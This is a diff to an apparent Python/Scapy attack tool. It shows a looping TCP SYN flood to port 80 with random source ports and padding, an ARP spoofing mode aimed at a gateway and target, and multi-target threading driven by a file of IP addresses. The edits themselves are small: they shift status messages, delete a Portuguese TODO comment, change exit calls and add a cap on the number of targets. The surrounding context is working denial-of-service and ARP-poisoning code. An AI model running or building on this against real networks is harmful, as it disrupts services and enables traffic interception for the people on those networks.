@@ -56,12 +56,10 @@ def thread_delay(thread_name, delay, ip):
 		tcp=TCP(sport=RandShort(), dport=80, flags="S")
 		raw=Raw(b"x"*1024)
 		p=ip_layer/tcp/raw
-		print("Sending packets... Press CTRL+C to stop.")
-
 		send(p, loop=1, verbose=0)
 
 	if args.arp:
-		if args.host: #METER UM ELSE A DIZER QUE ESTE HOST É OBRIGATORIO NO ARP
+		if args.host: 
 			try:
 				gtw = ipaddress.ip_address(args.host)
 			except:
@@ -83,7 +81,7 @@ def thread_delay(thread_name, delay, ip):
 				restore(host, target)
 		else:
 			print("Host IP address in mandatory!")
-			exit(1)
+			os._exit(1)
 	
 
 
@@ -180,7 +178,7 @@ if args.ip:
 		send(p, loop=1, verbose=0)
 
 	if args.arp:
-		if args.host: #METER UM ELSE A DIZER QUE ESTE HOST É OBRIGATORIO NO ARP
+		if args.host: 
 			try:
 				gtw = ipaddress.ip_address(args.host)
 			except:
@@ -210,6 +208,10 @@ else:
 	if args.file:
 		
 		Lines = args.file.readlines()
+		n_lines = len(Lines)
+		if n_lines > N_THREADS:
+				print("Maximum number of IP addresses is: %x"% N_THREADS)
+				exit(1)
 
 		#argument validation 
 		for line in Lines:
@@ -243,10 +245,11 @@ else:
 				os._exit(1)
 		else:
 			try:
-				print("\n Press CTRL+C to exit...")
+				print("Sending packets... Press CTRL+C to stop.")
 
 				while True:
 					time.sleep(0.5)
+
 			except (KeyboardInterrupt, SystemExit):
 				print("\n Terminating...")
 				os._exit(1)
